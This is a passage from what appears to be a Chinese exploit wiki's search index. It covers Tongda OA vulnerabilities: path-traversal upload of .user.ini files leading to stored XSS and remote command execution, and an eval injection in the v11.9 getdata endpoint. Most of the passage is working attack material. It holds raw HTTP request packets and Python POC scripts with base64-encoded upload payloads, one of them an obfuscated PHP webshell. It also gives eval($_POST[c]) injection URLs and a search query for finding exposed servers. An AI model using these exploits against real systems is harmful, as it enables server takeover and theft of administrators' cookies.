","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-getway.php-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.8 update.php 后台文件包含XSS漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有xss语句的文件，使管理员后台文件均包含XSS语句，被攻击者获取敏感信息 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA \u003c v11.8 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 这里使用的环境为通达 v11.6版本，v11.6版本中的漏洞利用较好，在 v11.7 后续版本中规定了上传路径，导致XSS利用会比较困难 出现漏洞的文件为 webroot/general/hr/manage/staff_info/update.php \u003c?php include_once \"inc/auth.inc.php\"; include_once \"inc/utility_all.php\"; include_once \"inc/utility_file.php\"; include_once \"inc/utility_field.php\"; include_once \"inc/utility_cache.php\"; include_once \"general/system/log/annual_leave_log.php\"; if (strstr($BYNAME, \"/\") || strstr($BYNAME, \"\\\\\") || strstr($BYNAME, \"..\")) { Message(_(\"错误\"), _(\"OA用户名包含非法字符！\")); exit(); } include_once \"inc/header.inc.php\"; echo \"\\r\\n\u003cbody class=\\\"bodycolor\\\"\u003e\\r\\n\"; echo \"\\r\\n\u003cbody class=\\\"bodycolor\\\"\u003e\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"附件上传失败\"), _(\"原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！\")); Button_Back(); exit(); } } 在这里参数 $USER_ID 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 ../../../ 我们就可以任意文件上传了 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 .user.ini 文件来包含其他文件，这里是可以用于包含XSS语句的文件的，所以我们上传文件 内容为 auto_prepend_file=test.log 我们想要最大化利用可以上传在首页或者管理员 界面，利用自定义弹窗来渗透 这里对管理员页面 general 目录上传 请求包为 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" 提交 -----------------------------17518323986548992951984057104-- 其中 USER_ID=../../general/.user 为上传路径 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log 这里拼接后上传就变成了 .user.ini 这里再上传 XSS文件 peiqi.log 被包含进去 上传后每次管理员登录后都会带着Cookie请求一次XSS平台 钓鱼什么的代码写在peiqi.log文件里就好啦 刚刚提到了 v11.7版本不方便利用，这是因为在后续版本加上了文件上传的规定路径 if ((strpos($source, \"webroot\") !== false) \u0026\u0026 (strpos($source, \"attachment\") === false)) { return false; } else { return true; } 路径中必须要包含 webroot 和 attachment 才可以上传 这里XSS的利用点有4个文件夹，其中最有几率XSS的为存储目录管理的文件夹 用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC 因为是xss可能对目标有影响，所以这里POC在一个不常用目录探测是否存在漏洞 Cookie填写访问后台时的Cookie, 其中的base64解码更改 PeiQi_Wiki为 自己的XSS语句 v11.6及以下 攻击 /general 和 /general/system/attachment 目录较好 v11.6以上 攻击 /general/system/attachment 目录较好 import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA \u003c V11.8 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie \u003e\u003e\u003e xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 https://paper.seebug.org/1499/ ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/:6:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABxss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.8 update.php 后台文件包含命令执行漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有PHP语句的文件导致命令执行 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA \u003c v11.8 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 这里使用的环境为通达 v11.6版本 出现漏洞的文件为 webroot/general/hr/manage/staff_info/update.php \u003c?php include_once \"inc/auth.inc.php\"; include_once \"inc/utility_all.php\"; include_once \"inc/utility_file.php\"; include_once \"inc/utility_field.php\"; include_once \"inc/utility_cache.php\"; include_once \"general/system/log/annual_leave_log.php\"; if (strstr($BYNAME, \"/\") || strstr($BYNAME, \"\\\\\") || strstr($BYNAME, \"..\")) { Message(_(\"错误\"), _(\"OA用户名包含非法字符！\")); exit(); } include_once \"inc/header.inc.php\"; echo \"\\r\\n\u003cbody class=\\\"bodycolor\\\"\u003e\\r\\n\"; echo \"\\r\\n\u003cbody class=\\\"bodycolor\\\"\u003e\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"附件上传失败\"), _(\"原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！\")); Button_Back(); exit(); } } 在这里参数 $USER_ID 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 ../../../ 我们就可以任意文件上传了 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 .user.ini 文件来包含其他文件，这里是可以用于包含PHP语句的文件的，所以我们上传文件内容为 auto_prepend_file=peiqi.log 请求包为 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" 提交 -----------------------------17518323986548992951984057104-- 其中 USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user 为上传路径 关于更多原理参考 http://wiki.peiqi.tech 中的另一篇 通达OA v11.8 后台文件包含存储型XSS漏洞 这里我们简单知道了上传方式，那我们就通过 .user.ini文件 包含恶意文件 现在已经成功上传了恶意文件 访问 http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig 文件包含命令执行 在 v11.6中 上传的位置并没有限定所以可以上传在方便访问的目录(不需要登录) 而 v11.8中则有目录名的限制需要目录带有 webroot 和 attachment ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC 脚本在 v11.6 测试成功执行， 在 v11.6以上执行时 这个webshell无法执行命令 v11.7 v11.8可用蚁剑插件绕过连接webshell import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA \u003c V11.8 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie \u003e\u003e\u003e xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5pbmkiCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKYXV0b19wcmVwZW5kX2ZpbGU9dGVzdC5sb2cKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5sb2ciCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKPD9waHAgCmVjaG8gInRlc3RfV2lraSI7CiRwemtCPWNyZWF0ZV9mdW5jdGlvbihjaHIoMDEwMTc1MC8wMTY1MikuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoOTkwODEvOTA5KS5jaHIoMDEwMjUtMDY2MCksY2hyKDA1MTctMDM1MikuY2hyKDB4MzQzLTB4MmNkKS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuYmFzZTY0X2RlY29kZSgnS0E9PScpLmJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoNDQ0LTMyOSkuYmFzZTY0X2RlY29kZSgnYnc9PScpLmNocig1OTctNDg4KS5jaHIoMHgxOWYtMHgxM2EpLmNocigyMTktMTc4KS5iYXNlNjRfZGVjb2RlKCdPdz09JykpOyRwemtCKGJhc2U2NF9kZWNvZGUoJ05EZzFOJy4nemMyTzAnLidCbGRrRicuJ3NLQ1JmJy4nJy5jaHIoODIxMTAvOTY2KS5iYXNlNjRfZGVjb2RlKCdSUT09Jykuc3RyX","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.9 getdata 任意命令执行漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.9 getdata接口存在任意命令执行漏洞，攻击者通过漏洞可以执行服务器任意命令控制服务器权限 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v11.9 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"通达OA网络智能办公系统\" ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*\u0026id=19\u0026module=Carouselimage /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[c]))%3B/*\u0026id=19\u0026module=Carouselimage ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-getdata-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v11.9 upsharestatus 后台SQL注入漏洞 